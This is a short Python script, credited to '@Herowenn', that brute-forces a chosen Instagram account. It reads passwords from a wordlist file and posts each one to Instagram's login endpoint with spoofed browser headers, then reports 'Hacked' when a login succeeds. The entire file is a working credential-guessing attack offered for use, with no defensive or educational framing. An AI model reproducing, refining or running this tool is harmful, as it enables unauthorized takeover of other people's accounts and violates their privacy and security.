import requests
import time
import random
import string

# ✦ Color ✦
R = '\033[31m'
G = '\033[32m'
B = "\033[1;90m" 
E = "\033[1;92m"
A = "\033[1;91m"

print(f'''

''')
print(A+'By : @Herowenn')
print(A+"- - - - - - - - - - - - - - - - - - - - - - - - -")

session = requests.Session()
time.sleep(0.5)
user = input(E+"Enter User: ")
time.sleep(0.5)
password = input(E+"Enter Password File Name: ")
file = open(f"{password}", "r")

def insta():
	while True:
		password = file.readline().split('\n')[0]
		
		url = "https://www.instagram.com/accounts/login/ajax/"
		
		headers = {
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
			'x-csrftoken': 'DCZhg6NyYYpnopQuiT4LrxuymupjJPnj',
			'x-instagram-ajax': 'ae566ed55fb7',
			'x-ig-app-id': '936619743392459'
		}
		
		tim = str(time.time()).split(".")[1]
		
		data = {
			'username': f'{user}',
			'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim}:{password}',
			'queryParams': {},
			'optIntoOneTap': 'false'
		}
		
		req = session.post(url, headers=headers, data=data).text
		
		if ('"authenticated":true') in req:
			print(G+f"Hacked user:{user} pass:{password}")
			input("")
			
		elif '"checkpoint_url"' in req:
			print("sre.. !")
			
		else:
			print(R+f"Not Hacked user:{user} pass:{password}")
			
		time.sleep(1)
		
insta()
